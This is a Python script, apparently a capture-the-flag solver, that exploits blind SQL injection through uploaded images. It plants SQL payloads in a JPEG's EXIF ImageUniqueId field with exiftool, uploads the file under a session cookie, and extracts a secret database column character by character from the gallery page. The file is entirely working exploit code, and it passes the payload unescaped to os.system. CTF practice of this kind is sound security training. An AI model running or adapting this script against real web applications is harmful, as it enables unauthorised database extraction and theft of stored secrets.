#!/usr/bin/env python3
# -*- coding: utf-8 -*-

import os
import shutil
try:
    import requests
    from bs4 import BeautifulSoup
except:
    print("Install requests, bs4 please.")
    exit(-1)

COL_NAME = "verySecretThing"
TABLE_NAME = "image"
INJECTION_LEN = "5', uniqueId=(select LENGTH(%s) from %s LIMIT 1) -- A"
INJECTION_CHAR = "5', uniqueId=(SELECT ASCII(SUBSTR(%s,%d,%d)) from %s LIMIT 1) -- A"

KEY_WORD = "uniqueId : "

class Solver:
    def __init__(self, url, session_cookie, absolute_filename):
        self.url = url
        self.session_cookie = session_cookie
        self.absolute_filename = absolute_filename
        self.filename = absolute_filename.split('/')[-1]
        self.path = "/".join(absolute_filename.split('/')[0:-1])

    def injection_lenght_password(self, session, solver_dir):
        filename = "%s/%s.jpg" % (solver_dir, "len")
        shutil.copyfile(self.absolute_filename, filename)
        injection = INJECTION_LEN % (COL_NAME, TABLE_NAME)
        os.system('exiftool -ImageUniqueId="%s" %s' % (injection, filename))
        url = "%s/api/upload" % (self.url)
        with open(filename,'rb') as f:
            files={'file': (filename.split("/")[-1], f, "image/jpeg")}
            r = session.post(url, files=files)
            print(r.content)
        return r.ok

    def injection(self, i, session, solver_dir):
        filename = "%s/%d.jpg" % (solver_dir, i)
        shutil.copyfile(self.absolute_filename, filename)
        injection = INJECTION_CHAR % (COL_NAME, i, i, TABLE_NAME)
        os.system('exiftool -ImageUniqueId="%s" %s' % (injection, filename))
        url = "%s/api/upload" % (self.url)
        with open(filename,'rb') as f:
            files={'file': (filename.split("/")[-1], f, "image/jpeg")}
            r = session.post(url, files=files)
        return r.ok

    def get_info(self, session):
        url = "%s/gallery" % (self.url)
        r = session.get(url)
        if not r.ok:
            return None
        try:
            t = r.text[r.text.find(KEY_WORD) + len(KEY_WORD):]
            return int(t[:t.find('</p>')])
        except:
            return None

    def solve(self, solver_dir="solver"):
        session = requests.Session()
        session.cookies.set("session", self.session_cookie)

        solver_path = "%s/%s" % (self.path, solver_dir)
        print("Create files on %s... " % solver_path)
        if not os.path.exists(solver_path):
            os.mkdir(solver_path)

        print("Injection lenght... ", end='')
        if not self.injection_lenght_password(session, solver_dir):
            return None
        l = self.get_info(session)
        print(l)
        if l is None:
            return None
        i = input('Continue ? Y/n ')
        if i == 'n' :
            exit()
        flag = ""
        for i in range(1, l+1):
            print("Injection character N°%d... " % i, end='')
            if not self.injection(i, session, solver_dir):
                return None
            c = self.get_info(session)
            if c is None:
                return None
            print('%d -> %s' % (c, chr(c)))
            flag = "%s%s" % (flag, chr(c))
        return flag

import sys

if __name__ == "__main__":
    if not (len(sys.argv) == 4 or len(sys.argv) == 5):
        print('Usage : ./solve.py url session_id absolute_filename_upload [--workdir=]')
        exit()
    url = sys.argv[1] #"http://localhost:5000"
    session = sys.argv[2] #SESSION_COOKIE
    absolute_filename = sys.argv[3] #"/tmp/miaou/1.jpg"
    s = Solver(url, session, absolute_filename)
    if len(sys.argv) == 5:
        flag = s.solve(sys.argv[4].split('=')[-1])
    else:
        flag = s.solve()
    if flag is None:
        print('error')
        exit(-1)
    print("Flag : %s" % flag)
